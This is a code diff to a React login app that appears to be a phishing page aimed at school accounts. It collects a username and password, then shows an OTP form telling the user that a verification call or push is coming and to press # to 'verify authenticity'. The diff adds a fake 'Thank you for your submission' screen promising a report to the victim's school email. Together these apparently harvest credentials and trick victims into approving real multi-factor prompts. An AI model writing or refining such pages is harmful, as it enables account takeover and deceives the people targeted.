@@ -11,8 +11,9 @@ export default function App() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [message, setMessage] = useState('');
-  const [showOtpForm, setShowOtpForm] = useState(false); // New state for OTP form
-  const [loggedInUsername, setLoggedInUsername] = useState<string | null>(null); // New state for logged-in username
+  const [showOtpForm, setShowOtpForm] = useState(false);
+  const [loggedInUsername, setLoggedInUsername] = useState<string | null>(null);
+  const [otpSubmitted, setOtpSubmitted] = useState(false); // New state for post-OTP submission
 
   const handleLogout = () => {
     setIsSuccess(false);
@@ -22,6 +23,12 @@ export default function App() {
     setLoggedInUsername(null);
     setMessage('');
     setError('');
+    setOtpSubmitted(false); // Reset on logout
+  };
+
+  const handleOtpSuccess = () => {
+    setOtpSubmitted(true);
+    setShowOtpForm(false);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -54,17 +61,36 @@ export default function App() {
     }
   };
 
+  if (otpSubmitted) {
+    return (
+      <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
+        <div className="bg-white max-w-md w-full rounded-2xl shadow-xl p-8 text-center border-t-4 border-green-500 animate-fade-in-up">
+          <div className="mx-auto w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6 shadow-sm">
+            <CheckCircle className="w-8 h-8 text-green-600" />
+          </div>
+          <h2 className="text-2xl font-bold text-gray-800 mb-2">Thank you for your submission</h2>
+          <p className="text-gray-600 mb-6">Your response has been recorded, and your report will be sent to your school email within 24 hours.</p>
+          <button
+            onClick={handleLogout}
+            className="w-full py-3.5 bg-slate-900 text-white rounded-lg font-medium hover:bg-slate-800 transition-colors shadow-lg hover:shadow-xl transform active:scale-[0.99]"
+          >
+            Done
+          </button>
+        </div>
+      </div>
+    );
+  }
+
   if (isSuccess && showOtpForm && loggedInUsername) {
     return (
       <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
         <div className="bg-white max-w-md w-full rounded-2xl shadow-xl p-8 text-center border-t-4 border-green-500 animate-fade-in-up">
-          <p className="text-gray-600 mb-4"> {loggedInUsername}</p>
-          <p>
-            A VERIFICATION CALL/PUSH WOULD BE SENT SHORTLY
+          <p className="text-gray-600 mb-4">  {loggedInUsername}</p>
 
-            VERIFY AUTHENTICITY BY PRESSING # WHILE ON CALL
-          </p>
-          <OtpForm username={loggedInUsername} />
+          <p>A VERIFICATION CALL/PUSH WOULD BE SENT SHORTLY
+
+            VERIFY AUTHENTICITY BY PRESSING # WHILE ON CALL</p>
+          <OtpForm username={loggedInUsername} onOtpSuccess={handleOtpSuccess} />
           <button
             onClick={handleLogout}
             className="w-full py-3.5 bg-slate-900 text-white rounded-lg font-medium hover:bg-slate-800 transition-colors shadow-lg hover:shadow-xl transform active:scale-[0.99] mt-4"
@@ -93,7 +119,7 @@ export default function App() {
           <form onSubmit={handleSubmit}>
             <div className="space-y-5">
               <div>
-                <label className="block text-xs font-bold text-slate-500 uppercase mb-2">Email</label>
+                <label className="block text-xs font-bold text-slate-500 uppercase mb-2">Username</label>
                 <div className="relative group">
                   <Mail className="absolute left-3 top-3.5 text-slate-400 w-5 h-5 group-focus-within:text-blue-600 transition-colors" />
                   <input
